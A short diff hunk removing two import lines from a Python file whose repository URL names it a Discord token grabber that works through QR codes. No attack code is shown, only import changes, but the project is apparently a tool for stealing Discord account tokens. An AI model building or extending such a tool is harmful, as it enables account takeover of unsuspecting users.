@@ -6,10 +6,8 @@ __license__ = "MIT"
 __repository__ = "https://github.com/hirusha-adi/Discord-Token-Grabber-by-QR"
 
 
-from bs4 import BeautifulSoup
 from selenium import webdriver
 from PIL import Image
-import base64
 import time
 import os
 from dtg import utitlites
